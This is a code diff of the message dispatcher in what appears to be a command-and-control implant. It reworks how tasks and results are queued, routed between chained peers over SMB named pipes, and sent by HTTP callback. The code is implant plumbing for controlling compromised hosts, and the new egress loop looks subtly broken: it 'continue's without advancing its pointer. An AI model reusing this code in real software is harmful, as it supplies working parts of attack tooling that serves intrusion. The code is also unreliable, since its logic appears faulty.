@@ -1,17 +1,13 @@
 #include <core/include/dispatch.hpp>
 namespace Dispatcher {
 
-    BOOL PeekPeerId(const _stream *const stream) {
+    DWORD PeekPeerId(const _stream *const stream) {
         HEXANE
 
         uint32_t pid = 0;
-        x_memcpy(&pid, stream->buffer, 4);
 
-        if (x_memcmp(&Ctx->session.peer_id, &pid, 4) == 0) {
-            return TRUE;
-        }
-
-        return FALSE;
+        x_memcpy(&pid, B_PTR(stream->buffer) + 1, 4);
+        return pid;
     }
 
     VOID AddMessage(_stream *const out) {
@@ -75,7 +71,7 @@ namespace Dispatcher {
         } else {
             Parser::CreateParser(&parser, B_PTR(out->buffer), out->length);
 
-            queue           = Stream::CreateStream();
+            queue            = Stream::CreateStream();
             queue->peer_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
             queue->task_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
             queue->msg_type  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
@@ -133,7 +129,7 @@ namespace Dispatcher {
         }
     }
 
-    BOOL PrepareQueue(_stream *out) {
+    BOOL PrepareEgressMessage(_stream *out) {
         HEXANE
 
         _stream *head   = Ctx->transport.outbound_queue;
@@ -141,36 +137,33 @@ namespace Dispatcher {
         bool success    = true;
 
         while (head) {
-            if (!head->ready) {
-                if (head->length + MESSAGE_HEADER_SIZE + out->length + 4 > MESSAGE_MAX) {
-                    break;
-                }
+            // if a message is inbound , don't process it
+            if (B_PTR(head->buffer)[0] != 0) {
+                continue;
+            }
+            if (head->buffer) {
+                Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
+                Stream::PackDword(out, head->peer_id);
+                Stream::PackDword(out, head->task_id);
+                Stream::PackDword(out, head->msg_type);
 
-                if (head->buffer) {
-                    Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
-                    Stream::PackDword(out, head->peer_id);
-                    Stream::PackDword(out, head->task_id);
-                    Stream::PackDword(out, head->msg_type);
+                if (Ctx->root) {
+                    // if message has reached exit node, prepare final header for server by appending msg body length
+                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
 
-                    if (Ctx->root) {
-                        // if message reached the exit node, prepare the header for the server, adding message body length
-                        Stream::PackBytes(out, B_PTR(head->buffer), head->length);
-
-                    } else {
-                        // else send to the next client as-is
-                        out->buffer = x_realloc(out->buffer, out->length + head->length);
-                        x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
-
-                        out->length += head->length;
-                    }
                 } else {
-                    success = false;
-                    return_defer(ERROR_INVALID_USER_BUFFER);
-                }
+                    // else leave as-is for the next client
+                    out->buffer = x_realloc(out->buffer, out->length + head->length);
 
-                head->ready = true;
+                    x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
+                    out->length += head->length;
+                }
+            } else {
+                success = false;
+                return_defer(ERROR_INVALID_USER_BUFFER);
             }
 
+            head->self = head;
             head = head->next;
         }
 
@@ -179,57 +172,56 @@ namespace Dispatcher {
         return success;
     }
 
+    VOID PrepareIngressMessage(_stream *in){
+        HEXANE
+
+        if (in) {
+            RemoveMessage(in->self); // need a pointer to the message we just sent
+            if (PeekPeerId(in) != Ctx->session.peer_id) {
+                OutboundQueue(in);
+            } else {
+                CommandDispatch(in);
+            }
+        } else {
+            auto head = Ctx->transport.outbound_queue;
+            while (head) {
+                head->ready = FALSE;
+                head = head->next;
+            }
+        }
+    }
+
     VOID MessageTransmit() {
         HEXANE
 
         _stream *out    = Stream::CreateStream();
         _stream *in     = { };
-        _stream *head   = { };
 
         retry:
         if (!Ctx->transport.outbound_queue) {
-
 #ifdef TRANSPORT_SMB
-        return_defer(ERROR_SUCCESS);
-#elifdef TRANSPORT_HTTP
-        auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
-
-        OutboundQueue(entry);
-        goto retry;
+            return_defer(ERROR_SUCCESS);
+#else
+            auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
+            OutboundQueue(entry);
+            goto retry;
 #endif
         } else {
-            if (!PrepareQueue(out)) {
+            if (!PrepareEgressMessage(out)) {
                 return_defer(ntstatus);
             }
         }
 
 #ifdef TRANSPORT_HTTP
         Network::Http::HttpCallback(out, &in);
-#elif TRANSPORT_PIPE
-        Network::Smb::SmbSend(out);
-        Network::Smb::SmbReceive(&in);
+#else
+        Network::Smb::PipeSend(out);
+        Network::Smb::PipeReceive(&in);
 #endif
-        if (NT_SUCCESS(ntstatus)) {
-            Stream::DestroyStream(out);
-        }
+        Stream::DestroyStream(out);
+        Dispatcher::PrepareIngressMessage(in);
 
-        // remove stream from queue
-
-        if (in) {
-            if (!PeekPeerId(in)) {
-                OutboundQueue(in);
-            } else {
-                CommandDispatch(in);
-            }
-        } else {
-            head = Ctx->transport.outbound_queue;
-            while (head) {
-                head->ready = FALSE;
-                head = head->next;
-            }
-        }
-
-        Clients::ClientPush();
+        Clients::PushClients();
 
     defer:
     }
